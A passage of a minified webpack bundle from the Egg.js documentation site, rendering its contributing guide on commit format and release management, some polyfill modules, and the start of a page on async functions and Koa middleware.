888",xmlnsXlink:"http://www.w3.org/1999/xlink"},r.a.createElement("defs",null,r.a.createElement("path",{id:"MJX-1-TEX-I-1D459",d:"M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D45C",d:"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D450",d:"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D44E",d:"M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D461",d:"M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D456",d:"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"}),r.a.createElement("path",{id:"MJX-1-TEX-I-1D45B",d:"M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"}),r.a.createElement("path",{id:"MJX-1-TEX-N-2C",d:"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"})),r.a.createElement("g",{stroke:"currentColor",fill:"currentColor",strokeWidth:"0",transform:"scale(1,-1)"},r.a.createElement("g",{"data-mml-node":"math"},r.a.createElement("g",{"data-mml-node":"mi"},r.a.createElement("use",{"data-c":"1D459",xlinkHref:"#MJX-1-TEX-I-1D459"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(298,0)"},r.a.createElement("use",{"data-c":"1D45C",xlinkHref:"#MJX-1-TEX-I-1D45C"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(783,0)"},r.a.createElement("use",{"data-c":"1D450",xlinkHref:"#MJX-1-TEX-I-1D450"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(1216,0)"},r.a.createElement("use",{"data-c":"1D44E",xlinkHref:"#MJX-1-TEX-I-1D44E"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(1745,0)"},r.a.createElement("use",{"data-c":"1D461",xlinkHref:"#MJX-1-TEX-I-1D461"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2106,0)"},r.a.createElement("use",{"data-c":"1D456",xlinkHref:"#MJX-1-TEX-I-1D456"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2451,0)"},r.a.createElement("use",{"data-c":"1D45C",xlinkHref:"#MJX-1-TEX-I-1D45C"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2936,0)"},r.a.createElement("use",{"data-c":"1D45B",xlinkHref:"#MJX-1-TEX-I-1D45B"})),r.a.createElement("g",{"data-mml-node":"mo",transform:"translate(3536,0)"},r.a.createElement("use",{"data-c":"2C",xlinkHref:"#MJX-1-TEX-N-2C"}))))))),"browser, ",r.a.createElement("span",{className:"math math-inline"},r.a.createElement("mjx-container",{className:"MathJax",jax:"SVG"},r.a.createElement("svg",{style:{verticalAlign:"-0.439ex"},xmlns:"http://www.w3.org/2000/svg",width:"8.339ex",height:"2.009ex",role:"img",focusable:"false",viewBox:"0 -694 3686 888",xmlnsXlink:"http://www.w3.org/1999/xlink"},r.a.createElement("defs",null,r.a.createElement("path",{id:"MJX-2-TEX-I-1D450",d:"M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D45C",d:"M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D45A",d:"M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D45D",d:"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D456",d:"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D459",d:"M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"}),r.a.createElement("path",{id:"MJX-2-TEX-I-1D452",d:"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"}),r.a.createElement("path",{id:"MJX-2-TEX-N-2C",d:"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"})),r.a.createElement("g",{stroke:"currentColor",fill:"currentColor",strokeWidth:"0",transform:"scale(1,-1)"},r.a.createElement("g",{"data-mml-node":"math"},r.a.createElement("g",{"data-mml-node":"mi"},r.a.createElement("use",{"data-c":"1D450",xlinkHref:"#MJX-2-TEX-I-1D450"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(433,0)"},r.a.createElement("use",{"data-c":"1D45C",xlinkHref:"#MJX-2-TEX-I-1D45C"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(918,0)"},r.a.createElement("use",{"data-c":"1D45A",xlinkHref:"#MJX-2-TEX-I-1D45A"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(1796,0)"},r.a.createElement("use",{"data-c":"1D45D",xlinkHref:"#MJX-2-TEX-I-1D45D"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2299,0)"},r.a.createElement("use",{"data-c":"1D456",xlinkHref:"#MJX-2-TEX-I-1D456"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2644,0)"},r.a.createElement("use",{"data-c":"1D459",xlinkHref:"#MJX-2-TEX-I-1D459"})),r.a.createElement("g",{"data-mml-node":"mi",transform:"translate(2942,0)"},r.a.createElement("use",{"data-c":"1D452",xlinkHref:"#MJX-2-TEX-I-1D452"})),r.a.createElement("g",{"data-mml-node":"mo",transform:"translate(3408,0)"},r.a.createElement("use",{"data-c":"2C",xlinkHref:"#MJX-2-TEX-N-2C"}))))))),"rootScope, ngHref, ngClick, ngView, etc..."),r.a.createElement("p",null,"\uff083\uff09subject"),r.a.createElement("p",null,"Use succinct words to describe what did you do in the commit change."),r.a.createElement("p",null,"\uff084\uff09body"),r.a.createElement("p",null,"Feel free to add more content in the body, if you think subject is not self-explanatory enough, such as what it is the purpose or reasone of you commit."),r.a.createElement("p",null,"\uff085\uff09footer"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"If the commit is a Breaking Change, please note it clearly in this part.")),r.a.createElement("li",null,"related issues, like ",r.a.createElement("code",null,"Closes #1, Closes #2, #3")),r.a.createElement("li",null,"If there is a change about an old feaure or a new feature, please associate ",r.a.createElement("code",null,"doc")," and ",r.a.createElement("code",null,"egg-core"),", like ",r.a.createElement("code",null,"eggjs/egg-core#123"))),r.a.createElement("p",null,"e.g."),r.a.createElement(o["a"],{code:"fix($compile): [BREAKING_CHANGE] couple of unit tests for IE9\n\nOlder IEs serialize html uppercased, but IE9 does not...\nWould be better to expect case insensitive, unfortunately jasmine does\nnot allow to user regexps for throw expectations.\n\nDocument change on eggjs/egg#123\n\nCloses #392\n\nBREAKING CHANGE:\n\n  Breaks foo.bar api, foo.baz should be used instead",lang:"unknown"}),r.a.createElement("p",null,"Look at ",r.a.createElement(l["Link"],{to:"https://docs.google.com/document/d/1QrDFcIiPjSLDn3EL15IJygNPiHORgU1_OOAqWjiDU5Y/edit"},"these files")," for more details."),r.a.createElement("h3",{id:"principles-of-english-translations"},r.a.createElement(l["AnchorLink"],{to:"#principles-of-english-translations","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Principles of English Translations"),r.a.createElement("p",null,"We follow the normal principles of English articles when translating, however, due to there're some special principles of titles, we should follow these rules:"),r.a.createElement("ul",null,r.a.createElement("li",null,"For nouns, verbs, pronouns, adjectives and adverbs, capitalize the first character. For prepsitions, articles, conjections, interjections and auxiliary words, the first character should be in lowercase. ",r.a.createElement("strong",null,"the character of the first word and the last word for title should be capitalized, regardless of what it is"),"."),r.a.createElement("li",null,"For proper nouns such as the direct reference of a variable or the name of a plugin, we must use backtick (underneath the 'Esc') to surround them and keep what they are in origin."),r.a.createElement("li",null,"For prepsitions more than 5 characters, their first characters should be also capitalized, otherwise not."),r.a.createElement("li",null,"For some very important titles or some fixed proper nouns such as methods of Http: POST,GET,PUT,DELETE, every charater can be capitalized (USE WITH CAUTION)."),r.a.createElement("li",null,'If the article belongs to the form of O-V (Object-Verb) such as "Config Management", we\'d better translate it as "Management Configuration", or "Managing Configuration" in the form of "gerund+noun".'),r.a.createElement("li",null,"If your title is taken as a sentence, write in 'Sentence Case' (e.g: In FAQ, each title is actually an English sentence).")),r.a.createElement("p",null,"For more info, please refer ",r.a.createElement(l["Link"],{to:"https://headlinecapitalization.com/"},"English Title Case"),"."),r.a.createElement("h2",{id:"release-management"},r.a.createElement(l["AnchorLink"],{to:"#release-management","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Release Management"),r.a.createElement("p",null,"Egg uses semantic versioning in release process based on ",r.a.createElement(l["Link"],{to:"https://semver.org/"},"semver"),"."),r.a.createElement("h3",{id:"branch-strategy"},r.a.createElement(l["AnchorLink"],{to:"#branch-strategy","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Branch Strategy"),r.a.createElement("p",null,r.a.createElement("code",null,"master")," branch is the latest stable version. ",r.a.createElement("code",null,"next")," branch is the next stable version working in progress."),r.a.createElement("ul",null,r.a.createElement("li",null,"All new features will be added into ",r.a.createElement("code",null,"master")," or ",r.a.createElement("code",null,"next")," branch as well as all bug-fix except security issues. In such way, we can motivate developers to update to the latest stable version."),r.a.createElement("li",null,"If any API is discarded, it should be noted with ",r.a.createElement("code",null,"deprecate")," in current stable version. The old version of API should be compatiable until the release of next stable version."),r.a.createElement("li",null,r.a.createElement("code",null,"master")," branch doesn't have publish tag. High-level framework can work with stable versions defined by semantic versioning."),r.a.createElement("li",null,r.a.createElement("code",null,"next")," branch is labelled with ",r.a.createElement("code",null,"next")," tag, high-level framework can use ",r.a.createElement("code",null,"egg@next")," to test the in-progress version."),r.a.createElement("li",null,"The LTS versions of Egg determined by Milestone. If a version is listed in Milestone, then it is a LTS version. We will patch it if there is any problem with it.")),r.a.createElement("h3",{id:"release-strategy"},r.a.createElement(l["AnchorLink"],{to:"#release-strategy","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Release Strategy"),r.a.createElement("p",null,"In the release of every stable version, there will be a PM who has the following responsibilities in different stages of the release."),r.a.createElement("h4",{id:"preparation"},r.a.createElement(l["AnchorLink"],{to:"#preparation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Preparation"),r.a.createElement("ul",null,r.a.createElement("li",null,"Set up milestone. Confirm that request is related to milestone. Assign and update issues, like ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/milestone/1"},"1.x milestone"),"."),r.a.createElement("li",null,"Create a ",r.a.createElement("code",null,"next")," branch from ",r.a.createElement("code",null,"master")," branch and tag it as ",r.a.createElement("code",null,"next"),".")),r.a.createElement("h4",{id:"before-release"},r.a.createElement(l["AnchorLink"],{to:"#before-release","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Before Release"),r.a.createElement("ul",null,r.a.createElement("li",null,"Confirm that performance test is passed and all issues in current Milestone are either closed or can be delayed to later versions."),r.a.createElement("li",null,"Open a new ",r.a.createElement(l["Link"],{to:"https://github.com/nodejs/node/pull/4181"},"Release Proposal MR"),", and write ",r.a.createElement("code",null,"History")," as ",r.a.createElement(l["Link"],{to:"https://github.com/nodejs/node/blob/master/CHANGELOG.md"},"node CHANGELOG"),". Don't forget to correct content in documentation which is related to the releasing version. Commits can be generated automatically.",r.a.createElement(o["a"],{code:"$ npm run commits",lang:"bash"})),r.a.createElement("li",null,"Nominate PM for next stable version.")),r.a.createElement("h4",{id:"during-release"},r.a.createElement(l["AnchorLink"],{to:"#during-release","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"During Release"),r.a.createElement("ul",null,r.a.createElement("li",null,"Back up the stable version (master) onto the branch named after the current major (e.g: ",r.a.createElement("code",null,"1.x"),"), and set the tag to ",r.a.createElement("code",null,"release-","{","v","}",".x")," (v is the current version like ",r.a.createElement("code",null,"release-1.x"),")."),r.a.createElement("li",null,"Push the ",r.a.createElement("code",null,"next")," branch to ",r.a.createElement("code",null,"master"),", make it to the last stable one and remove ",r.a.createElement("code",null,"next")," tag, change the contents corresponding to the branch in README."),r.a.createElement("li",null,"Publish the latest stable version to ",r.a.createElement(l["Link"],{to:"http://npmjs.com/"},"npm"),", and notify the previous framework to be upgraded."),r.a.createElement("li",null,"Before doing ",r.a.createElement("code",null,"npm publish"),", please read ",r.a.createElement(l["Link"],{to:"https://fengmk2.com/blog/2016/how-i-publish-a-npm-package"},"How to deploy an npm package"),".")),r.a.createElement("p",null,"All tags mentioned above means the tags of npm in ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement(o["a"],{code:'"publishConfig": {\n  "tag": "next"\n}',lang:"json"}),r.a.createElement("style",{dangerouslySetInnerHTML:{__html:'\nmjx-container[jax="SVG"] {\n  direction: ltr;\n}\n\nmjx-container[jax="SVG"] > svg {\n  overflow: visible;\n  min-height: 1px;\n  min-width: 1px;\n}\n\nmjx-container[jax="SVG"] > svg a {\n  fill: blue;\n  stroke: blue;\n}\n\nmjx-container[jax="SVG"][display="true"] {\n  display: block;\n  text-align: center;\n  margin: 1em 0;\n}\n\nmjx-container[jax="SVG"][display="true"][width="full"] {\n  display: flex;\n}\n\nmjx-container[jax="SVG"][justify="left"] {\n  text-align: left;\n}\n\nmjx-container[jax="SVG"][justify="right"] {\n  text-align: right;\n}\n\ng[data-mml-node="merror"] > g {\n  fill: red;\n  stroke: red;\n}\n\ng[data-mml-node="merror"] > rect[data-background] {\n  fill: yellow;\n  stroke: none;\n}\n\ng[data-mml-node="mtable"] > line[data-line], svg[data-table] > g > line[data-line] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node="mtable"] > rect[data-frame], svg[data-table] > g > rect[data-frame] {\n  stroke-width: 70px;\n  fill: none;\n}\n\ng[data-mml-node="mtable"] > .mjx-dashed, svg[data-table] > g > .mjx-dashed {\n  stroke-dasharray: 140;\n}\n\ng[data-mml-node="mtable"] > .mjx-dotted, svg[data-table] > g > .mjx-dotted {\n  stroke-linecap: round;\n  stroke-dasharray: 0,140;\n}\n\ng[data-mml-node="mtable"] > g > svg {\n  overflow: visible;\n}\n\n[jax="SVG"] mjx-tool {\n  display: inline-block;\n  position: relative;\n  width: 0;\n  height: 0;\n}\n\n[jax="SVG"] mjx-tool > mjx-tip {\n  position: absolute;\n  top: 0;\n  left: 0;\n}\n\nmjx-tool > mjx-tip {\n  display: inline-block;\n  padding: .2em;\n  border: 1px solid #888;\n  font-size: 70%;\n  background-color: #F8F8F8;\n  color: black;\n  box-shadow: 2px 2px 5px #AAAAAA;\n}\n\ng[data-mml-node="maction"][data-toggle] {\n  cursor: pointer;\n}\n\nmjx-status {\n  display: block;\n  position: fixed;\n  left: 1em;\n  bottom: 1em;\n  min-width: 25%;\n  padding: .2em .4em;\n  border: 1px solid #888;\n  font-size: 90%;\n  background-color: #F8F8F8;\n  color: black;\n}\n\nforeignObject[data-mjx-xml] {\n  font-family: initial;\n  line-height: normal;\n  overflow: visible;\n}\n\nmjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {\n  stroke-width: 3;\n}\n'}})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},W1of:function(e,t,n){"use strict";var a=n("ESdP"),r=n("YKhC"),l=n("x0yn");e.exports={formats:l,parse:r,stringify:a}},"W5/F":function(e,t,n){var a=n("Xdqv"),r=n("AaXQ"),l="".split;e.exports=a((function(){return!Object("z").propertyIsEnumerable(0)}))?function(e){return"String"==r(e)?l.call(e,""):Object(e)}:Object},WAUu:function(e,t,n){var a=n("0mt+"),r=n("FsiO");a({global:!0,forced:parseFloat!=r},{parseFloat:r})},WM7W:function(e,t,n){var a=n("sDrD"),r=n("31yA"),l=n("fbrm"),o=n("u3TI").f;e.exports=function(e){var t=a.Symbol||(a.Symbol={});r(t,e)||o(t,e,{value:l.f(e)})}},WMSp:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("BZjo"),c=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{every:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return!c(n,(function(e){if(!a(e,e,t))return c.stop()}),void 0,!1,!0).stopped}})},WQtb:function(e,t,n){var a=n("AcHn"),r=n("N0Us"),l=n("wzTy"),o=function(e){return function(t,n,o){var i,c=a(t),s=r(c.length),u=l(o,s);if(e&&n!=n){while(s>u)if(i=c[u++],i!=i)return!0}else for(;s>u;u++)if((e||u in c)&&c[u]===n)return e||u||0;return!e&&-1}};e.exports={includes:o(!0),indexOf:o(!1)}},Warj:function(e,t,n){},WeeI:function(e,t,n){"use strict";var a=function(e){return+setTimeout(e,16)},r=function(e){return clearTimeout(e)};"undefined"!==typeof window&&"requestAnimationFrame"in window&&(a=function(e){return window.requestAnimationFrame(e)},r=function(e){return window.cancelAnimationFrame(e)});var l=0,o=new Map;function i(e){o["delete"](e)}var c=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1;l+=1;var n=l;function r(t){if(0===t)i(n),e();else{var l=a((function(){r(t-1)}));o.set(n,l)}}return r(t),n};c.cancel=function(e){var t=o.get(e);return i(t),r(t)},t["a"]=c},X9n9:function(e,t,n){var a=n("0mt+"),r=n("JH4+");a({target:"Set",stat:!0},{of:r})},X9zN:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"asynchronous-programming-model"},r.a.createElement(l["AnchorLink"],{to:"#asynchronous-programming-model","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Asynchronous Programming Model"),r.a.createElement("p",null,"Node.js is an asynchronous world, asynchronous programming models in official API support are all in callback form\uff0cit brings many problems. For example:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://callbackhell.com/"},"callback hell"),': Notorious "callback hell"\u3002'),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://oren.github.io/#/articles/zalgo/"},"release zalgo"),": Asynchronous functions may call callback function response data synchronously which would bring inconsistency.")),r.a.createElement("p",null,"The community has provided many solutions for the problems and the winner is Promise. It is built into ECMAScript 2015. On the basis of Promise, and with the ability of Generator to switch context, we can write asynchronous code in a synchronous way with ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," and other third-party libraries. Meanwhile ",r.a.createElement(l["Link"],{to:"https://github.com/tc39/ecmascript-asyncawait"},"async function"),", the official solution has been published in ECMAScript 2017 and landed in Node.js 8."),r.a.createElement("h3",{id:"async-function"},r.a.createElement(l["AnchorLink"],{to:"#async-function","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Async Function"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/tc39/ecmascript-asyncawait"},"Async function")," is a syntactic sugar at the language level. In async function, we can use ",r.a.createElement("code",null,"await")," to wait for a promise to be resolved(or rejected, which will throw an exception), and Node.js LTS (8.x) has supported this feature."),r.a.createElement(o["a"],{code:"const fn = async function () {\n  const user = await getUser();\n  const posts = await fetchPosts(user.id);\n  return { user, posts };\n};\nfn()\n  .then((res) => console.log(res))\n  .catch((err) => console.error(err.stack));",lang:"js"}),r.a.createElement("h2",{id:"koa"},r.a.createElement(l["AnchorLink"],{to:"#koa","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Koa"),r.a.createElement("blockquote",null,r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://koajs.com/"},"Koa")," is a new Web framework designed by the team behind Express, which aims to be a smaller, more expressive, and more robust foundation for Web applications and APIs.")),r.a.createElement("p",null,"The design styles of Koa and Express are very similar, The underlying basic library is the same, ",r.a.createElement(l["Link"],{to:"https://github.com/jshttp"},"HTTP library"),". There are several significant differences between them. Besides the asynchronous solution by default mentioned above, there are the following points."),r.a.createElement("h3",{id:"midlleware"},r.a.createElement(l["AnchorLink"],{to:"#midlleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Midlleware"),r.a.createElement("p",null,"The middleware in Koa is different from Express, Koa use the onion model:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Middleware onion diagram:")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://camo.githubusercontent.com/d80cf3b511ef4898bcde9a464de491fa15a50d06/68747470733a2f2f7261772e6769746875622e636f6d2f66656e676d6b322f6b6f612d67756964652f6d61737465722f6f6e696f6e2e706e67",alt:""})),r.a.createElement("ul",null,r.a.createElement("li",null,"Middleware execution sequence diagram:")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://raw.githubusercontent.com/koajs/koa/a7b6ed0529a58112bac4171e4729b8760a34ab8b/docs/middleware.gif",alt:""})),r.a.createElement("p",null,"All the requests will be executed twice during one middleware. Compared to Express middleware, it is very easy to implement post-processing logic. You can obviously feel the advantage of Koa middleware model by comparing the compress middleware implementatio in Koa and Express."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/koajs/compress/blob/master/lib/index.js"},"koa-compress")," for Koa."),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/expressjs/compression/blob/master/index.js"},"compression")," for Express.")),r.a.createElement("h3",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Unlike that there are only two objects ",r.a.createElement("code",null,"Request")," and ",r.a.createElement("code",null,"Response")," in Express, Koa has one more, 